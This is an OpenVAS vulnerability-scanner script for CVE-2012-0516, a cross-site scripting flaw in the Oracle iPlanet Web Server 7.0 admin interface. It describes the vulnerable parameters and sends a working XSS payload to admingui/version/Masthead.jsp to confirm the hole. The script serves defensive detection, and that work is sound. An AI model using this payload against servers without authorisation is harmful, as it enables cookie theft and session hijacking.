##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_oracle_iplanet_web_server_xss_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Oracle iPlanet Web Server Multiple Cross Site Scripting Vulnerabilities
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the
  context of an affected site.
  Impact Level: Application";
tag_affected = "Oracle iPlanet WebServer 7.0";
tag_insight = "- Input passed via the 'helpLogoWidth' and 'helpLogoHeight' parameters to
    admingui/cchelp2/Masthead.jsp (when 'mastheadTitle' is set) and the
    'productNameSrc', 'productNameHeight', and 'productNameWidth' parameters
    to admingui/version/Masthead.jsp is not properly sanitised before being
    returned to the user.
  - Input passed via the 'appName' and 'pathPrefix' parameters to admingui/
    cchelp2/Navigator.jsp is not properly sanitised before being returned to
    the user.";
tag_solution = "Please refer below link for updates,
  http://www.oracle.com/technetwork/topics/security/cpuapr2012-366314.html#AppendixSUNS";
tag_summary = "This host is running Oracle iPlanet Web Server and is prone to
  multiple cross site scripting vulnerabilities.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.902844";
CPE = "cpe:/a:sun:iplanet_web_server";

if(description)
{
  script_id(902844);
  script_version("$Revision: 12 $");
  script_bugtraq_id(53133);
  script_cve_id("CVE-2012-0516");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-06-29 16:16:16 +0530 (Fri, 29 Jun 2012)");
  script_name("Oracle iPlanet Web Server Multiple Cross Site Scripting Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/81440");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/43942");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/53133");
  script_xref(name : "URL" , value : "http://www.oracle.com/technetwork/topics/security/cpuapr2012-366314.html");
  script_xref(name : "URL" , value : "http://chingshiong.blogspot.in/2012/04/oracle-iplanet-web-server-709-multiple.html");

  script_description(desc);
  script_summary("Check if iPlanet WebServer is vulnerable to cross site scripting");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 SecPod");
  script_family("Web Servers");
  script_dependencies("gb_sun_java_sys_web_serv_detect.nasl");
  script_require_ports("Services/www", 8989);
  script_require_keys("java_system_web_server/installed");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("host_details.inc");
include("openvas-https.inc");

## Variable Initialization
req = "";
res = "";
port = 0;
banner = "";

## Get HTTP Port
port = get_app_port(cpe:CPE, nvt:SCRIPT_OID);
if(! port){
  exit(0);
}

## Get iPlanet WebServer Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port)) {
  exit(0);
}

## Construct attack request
url = dir + "/admingui/version/Masthead.jsp?productNameSrc='%22--></style>" +
      "</script><script>alert(document.cookie)</script>&versionFile=../ver" +
      "sion/copyright?__token__=&productNameHeight=42&productNameWidth=221";

req = string("GET ", url, " HTTP/1.1\r\n",
             "Host: ", get_host_name(), "\r\n",
             "User-Agent: XSS-TEST\r\n");

## Send request and receive the response
res = https_req_get(port:port, request:req);

## Confirm exploit worked by checking the response
if(res && "<script>alert(document.cookie)</script>" >< res &&
   res =~ "HTTP/1.. 200" && "Server: Oracle-iPlanet-Web-Server" >< res){
  security_hole(port);
}
